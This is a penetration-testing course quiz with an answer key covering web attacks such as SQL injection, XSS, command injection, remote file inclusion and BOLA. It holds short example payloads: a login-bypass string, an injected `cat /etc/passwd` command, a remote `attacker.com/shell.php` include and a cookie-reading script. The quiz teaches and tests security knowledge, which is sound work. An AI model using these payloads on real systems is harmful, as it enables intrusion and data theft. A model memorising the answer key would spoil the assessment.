# Quiz: Module 10 — Web Application Exploit Methods

## Course: CIS-4333 Penetration Testing

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

**Instructions:** Choose the single best answer for each question.

---

**Question 1**

A penetration tester submits the input `' OR '1'='1` into a web application login form and successfully authenticates without valid credentials. Which vulnerability is being exploited?

- A) Cross-site scripting (XSS)
- B) Command injection
- C) SQL injection
- D) Session fixation

**Correct Answer:** C) SQL injection

**Distractor Analysis:**

- *Why C is correct:* The input `' OR '1'='1` manipulates the SQL query that the login form builds behind the scenes. By injecting SQL syntax into the username field, the attacker changes the logic of the WHERE clause so that the condition `'1'='1'` is always true, returning a valid user record regardless of the password provided. This is the classic authentication bypass form of SQL injection — it exploits the lack of parameterized queries or input sanitization in the backend database call.
- *Why A is incorrect:* Cross-site scripting injects JavaScript into the page output to execute in the victim's browser. The `OR '1'='1` construct is SQL syntax, not JavaScript. XSS does not affect authentication by manipulating database queries.
- *Why B is incorrect:* Command injection passes operating system commands to a shell interpreter via application input. The `OR '1'='1` payload is SQL logic, not a shell metacharacter sequence. The target interpreter is the database engine, not the OS shell.
- *Why D is incorrect:* Session fixation forces a victim to authenticate using a pre-known session token. It occurs after authentication, not as a mechanism to bypass the login check itself. The attack described manipulates the authentication query directly.

---

**Question 2**

A tester discovers that user-supplied comments are stored in the database and rendered on a public page without output encoding. Every visitor who loads that page executes the attacker's injected script. Which type of XSS vulnerability is this?

- A) Reflected XSS
- B) DOM-based XSS
- C) Stored XSS
- D) Second-order XSS

**Correct Answer:** C) Stored XSS

**Distractor Analysis:**

- *Why C is correct:* Stored XSS (also called persistent XSS) occurs when the malicious script is saved to the server-side database and served to every user who views the affected page. Because the payload persists and executes for all visitors automatically — not just those who click a crafted link — stored XSS is considered more dangerous than reflected XSS. Comment fields, user profiles, and message boards are the most common stored XSS vectors.
- *Why A is incorrect:* Reflected XSS requires the victim to click a specially crafted URL that includes the payload. The server reflects the payload back in a single response. The attack in this question persists in the database and affects all visitors without requiring any crafted link — that is the defining difference.
- *Why B is incorrect:* DOM-based XSS occurs entirely within the browser's Document Object Model. The server sends a legitimate page, but client-side JavaScript writes attacker-controlled data (such as the URL fragment) into the DOM unsafely. The attack in this question involves server-side storage and server-rendered HTML output, not a browser-side DOM manipulation.
- *Why D is incorrect:* Second-order XSS is a subtype of stored XSS where the payload is stored safely but injected into a different page context later. While the scenario described could technically be characterized this way, Stored XSS is the primary and correct PenTest+ term for this pattern.

---

**Question 3**

A web application builds OS commands using unsanitized user input. A tester submits `127.0.0.1; cat /etc/passwd` into a ping utility field and receives the contents of `/etc/passwd` in the response. Which vulnerability type does this represent?

- A) Directory traversal
- B) Remote file inclusion
- C) Command injection
- D) SQL injection

**Correct Answer:** C) Command injection

**Distractor Analysis:**

- *Why C is correct:* Command injection occurs when user input is concatenated into an operating system command without sanitization. The semicolon in `127.0.0.1; cat /etc/passwd` is a shell metacharacter that terminates the first command and executes a second. The application passes both commands to the OS shell, which executes `ping -c 1 127.0.0.1` and then `cat /etc/passwd`. Command injection is critical severity because it provides direct operating system access with the privileges of the web server process.
- *Why A is incorrect:* Directory traversal manipulates file path parameters using `../` sequences to read files outside the intended directory. It exploits path handling logic, not shell command construction. The payload in this question uses shell metacharacters, not path traversal sequences.
- *Why B is incorrect:* Remote file inclusion exploits a `page` or `file` parameter to include and execute a file from an attacker-controlled URL. It requires the PHP `allow_url_include` setting to be enabled. The attack in this question uses shell metacharacters to inject OS commands — the vulnerability is in command construction, not file inclusion logic.
- *Why D is incorrect:* SQL injection targets database query interpreters, not OS shell interpreters. The semicolon in this payload is being interpreted by the OS shell, not a SQL engine. The targets and mechanisms are distinct.

---

**Question 4**

During Burp Suite Intruder testing, a tester wants to test both a username list and a password list simultaneously, pairing each username with each password in a full cross-product. Which Intruder attack type should the tester select?

- A) Sniper
- B) Battering ram
- C) Pitchfork
- D) Cluster bomb

**Correct Answer:** D) Cluster bomb

**Distractor Analysis:**

- *Why D is correct:* Cluster bomb iterates all combinations of payloads across multiple insertion points — it is the Cartesian product of the payload lists. If the username list has 10 entries and the password list has 100 entries, Cluster bomb generates `10 * 100 = 1,000` requests, testing every username-password combination. This is the correct attack type for credential brute force where you want to try all pairings.
- *Why A is incorrect:* Sniper uses a single payload list and cycles through one insertion point at a time while keeping other positions fixed. It tests one position against all payloads, then moves to the next. It is designed for single-parameter fuzzing, not multi-parameter credential testing.
- *Why B is incorrect:* Battering ram uses a single payload list and inserts the same payload value into all insertion points simultaneously. If both username and password positions are marked, each request would have the same value in both fields (e.g., `admin` / `admin`). This is not a full credential enumeration.
- *Why C is incorrect:* Pitchfork iterates multiple payload lists in parallel — the first item from list 1 pairs with the first item from list 2, the second with the second, and so on. It does not generate all combinations; it steps through both lists together. Pitchfork is useful when testing known username-password pairs from a breach database, not when generating all combinations.

---

**Question 5**

A REST API endpoint at `/api/users/1042/profile` returns the profile of user 1042. A tester changes the ID to `/api/users/1043/profile` without modifying the authentication token and successfully retrieves another user's private profile data. Which vulnerability does this demonstrate?

- A) Mass assignment
- B) Broken Object Level Authorization (BOLA)
- C) Excessive data exposure
- D) Security misconfiguration

**Correct Answer:** B) Broken Object Level Authorization (BOLA)

**Distractor Analysis:**

- *Why B is correct:* BOLA (also known as Insecure Direct Object Reference, or IDOR) occurs when an API allows authenticated users to access objects — database records, files, resources — belonging to other users by simply changing an identifier in the request. The API validates that the user is authenticated but fails to verify that the authenticated user is authorized to access the specific resource they requested. This is OWASP API Security Top 10 item API1 and one of the most common API vulnerabilities found in real-world penetration tests.
- *Why A is incorrect:* Mass assignment occurs when an API blindly maps request body parameters to object fields, allowing an attacker to set fields that should be protected (such as `role` or `isAdmin`). It involves sending extra fields in a write request, not changing an ID to access another user's data in a read request.
- *Why C is incorrect:* Excessive data exposure occurs when an API returns more fields than the client displays — sensitive fields are present in the JSON response even though the UI does not render them. The vulnerability in this scenario is about authorization to access another user's record, not about too much data in a legitimate response.
- *Why D is incorrect:* Security misconfiguration is a broad category covering improper server settings, default credentials, unnecessary exposed services, and missing security headers. While the underlying failure here is an authorization design flaw, the specific vulnerability name for cross-user object access via ID manipulation is BOLA.

---

**Question 6**

A web application uses PHP and includes files based on the `page` URL parameter. The parameter currently contains `home.php`. An attacker tests the value `http://attacker.com/shell.php` for this parameter and the server fetches and executes the remote file. Which vulnerability is being exploited?

- A) Local file inclusion (LFI)
- B) Remote file inclusion (RFI)
- C) Server-side request forgery (SSRF)
- D) Directory traversal

**Correct Answer:** B) Remote file inclusion (RFI)

**Distractor Analysis:**

- *Why B is correct:* Remote file inclusion occurs when a PHP application uses user-supplied input in a `require()` or `include()` call and the PHP configuration has `allow_url_include = On`. The server fetches the URL provided by the attacker, and if that URL points to a PHP file containing malicious code, the server executes it. RFI is critical severity because it directly provides remote code execution on the server.
- *Why A is incorrect:* Local file inclusion also exploits the same `include()` vulnerability, but is limited to files already present on the server's local filesystem. The payload uses paths like `../../etc/passwd` rather than an external URL. LFI cannot fetch remote attacker-controlled files; RFI can.
- *Why C is incorrect:* Server-side request forgery causes the server to make HTTP requests to arbitrary URLs, often to internal services or cloud metadata endpoints. While SSRF also causes the server to fetch a URL, it differs from RFI in that SSRF is about reaching internal resources via the server as a proxy, not about executing a fetched file as PHP code.
- *Why D is incorrect:* Directory traversal uses `../` sequences to read files outside the web root on the local filesystem. It reads file contents but does not execute remote code. The payload in this question is an external URL, not a path traversal sequence.

---

**Question 7**

Which SQLMap flag enumerates all databases accessible to the database user connected to the target web application?

- A) `--tables`
- B) `--dump`
- C) `--dbs`
- D) `--level=5`

**Correct Answer:** C) `--dbs`

**Distractor Analysis:**

- *Why C is correct:* The `--dbs` flag instructs SQLMap to enumerate all databases visible to the current database connection. This is typically the second step after confirming injection is possible — after `--dbs` returns the database list, the tester uses `-D <dbname> --tables` to enumerate tables within a specific database, then `-T <tablename> --dump` to extract data.
- *Why A is incorrect:* `--tables` enumerates tables within a specific database. It requires the `-D` flag to specify which database to target. It does not list databases themselves.
- *Why B is incorrect:* `--dump` extracts data from a specific table. It requires `-D` and `-T` to specify the database and table. Using it without specifying a database or table would require additional context to function properly.
- *Why D is incorrect:* `--level=5` sets the detection thoroughness level, controlling how aggressively SQLMap tests for injection points (more HTTP parameters, more test payloads). It affects detection depth, not what database information is retrieved.

---

**Question 8**

A security researcher finds that a web application reflects user input directly into a JavaScript variable assignment without sanitization: `var name = 'USER_INPUT';`. The researcher enters `'; alert(document.cookie);//` and the script executes. Which category best describes this vulnerability?

- A) Reflected XSS via HTML injection
- B) Stored XSS via JavaScript context
- C) Reflected XSS via JavaScript context (break-out injection)
- D) DOM-based XSS

**Correct Answer:** C) Reflected XSS via JavaScript context (break-out injection)

**Distractor Analysis:**

- *Why C is correct:* The input breaks out of the JavaScript string context by closing the string with `'`, terminating the statement with `;`, injecting `alert(document.cookie)`, and commenting out the remaining original code with `//`. Because the payload is sent in the request and reflected in the server's response (not persisted in a database), this is reflected XSS. The injection occurs within a JavaScript execution context rather than an HTML tag context, requiring the break-out technique.
- *Why A is incorrect:* HTML injection XSS uses HTML tags like `<script>` inserted directly into HTML content. The scenario describes injection into an existing JavaScript variable assignment — the context is JavaScript, not HTML markup. Different contexts require different payload structures.
- *Why B is incorrect:* Stored XSS requires the payload to be saved to a database or server-side storage and served to subsequent users. This attack is reflected — the payload is included in the request and returned in the same response, not persisted.
- *Why D is incorrect:* DOM-based XSS occurs when client-side JavaScript reads attacker-controlled data from the DOM (such as `location.hash`) and writes it into the DOM unsafely, without the payload ever reaching the server. In this scenario the server is reflecting the payload in its HTML response — the injection is server-side, not DOM-side.

---

**Question 9**

A tester attempts credential stuffing against a web application login. Which characteristic of this attack most distinguishes it from a traditional brute force attack?

- A) Credential stuffing uses only commonly known passwords such as `password123` or `letmein`.
- B) Credential stuffing uses previously breached username and password pairs from unrelated services, exploiting password reuse.
- C) Credential stuffing requires the tester to first extract password hashes from the target system before attempting authentication.
- D) Credential stuffing tries all character combinations starting from one-character strings, incrementing length until a match is found.

**Correct Answer:** B) Credential stuffing uses previously breached username and password pairs from unrelated services, exploiting password reuse.

**Distractor Analysis:**

- *Why B is correct:* Credential stuffing leverages large databases of username-password pairs obtained from previous data breaches at other services. Because many users reuse the same password across multiple sites, valid credentials from a breach at Site A often grant access to Site B. The attacker does not need to guess or crack anything — they are testing known working credentials from other contexts. This is highly effective and difficult to prevent without multi-factor authentication.
- *Why A is incorrect:* Testing commonly known passwords against all accounts is password spraying — a distinct technique. Spraying uses a short list of popular passwords across many accounts to avoid lockout. Credential stuffing uses full username-password pairs from external breaches, not a generic popular-password list.
- *Why C is incorrect:* Credential stuffing is an online authentication attack against a live login service. It does not require any prior access to the target system or extraction of password hashes. Hash extraction is part of offline cracking workflows, not credential stuffing.
- *Why D is incorrect:* Incrementally trying all character combinations is the definition of brute force. Brute force is computationally expensive and starts from scratch. Credential stuffing starts with real credentials known to have worked elsewhere — a fundamentally different threat model.

---

**Question 10**

A developer is fixing a SQL injection vulnerability. Their current code concatenates user input directly into a SQL string. Which remediation approach eliminates the root cause of SQL injection?

- A) Implementing input length validation to reject strings longer than 50 characters
- B) Using a web application firewall to block requests containing single quotes
- C) Replacing string concatenation with parameterized queries (prepared statements)
- D) Switching the database from MySQL to PostgreSQL

**Correct Answer:** C) Replacing string concatenation with parameterized queries (prepared statements)

**Distractor Analysis:**

- *Why C is correct:* Parameterized queries (also called prepared statements) separate the SQL code structure from the data values. The query template is compiled first with placeholder tokens, and user input is bound as data — never interpreted as SQL syntax. Even if an attacker injects `' OR '1'='1`, the database treats the entire input as a literal string value, not as SQL logic. This eliminates the root cause of SQL injection rather than attempting to detect or filter payloads.
- *Why A is incorrect:* Length validation is useful for business logic but does not prevent SQL injection. A short SQL injection payload like `1' OR 1=1--` is well under 50 characters. Length limits are easily bypassed and do not address the structural cause of the vulnerability.
- *Why B is incorrect:* WAF-based single-quote blocking is a blacklist approach. Attackers bypass it using encoding (URL encoding, Unicode variants), alternate quote styles, comment sequences, or SQL dialects that do not require quotes. WAFs are a useful defense-in-depth layer but not a root-cause fix. The application code must be fixed.
- *Why D is incorrect:* SQL injection is a vulnerability in how the application constructs queries, not a property of any specific database engine. Switching from MySQL to PostgreSQL while continuing to concatenate unsanitized input into SQL strings produces identical injection vulnerabilities in the new database.

---

*End of Module 10 Quiz*
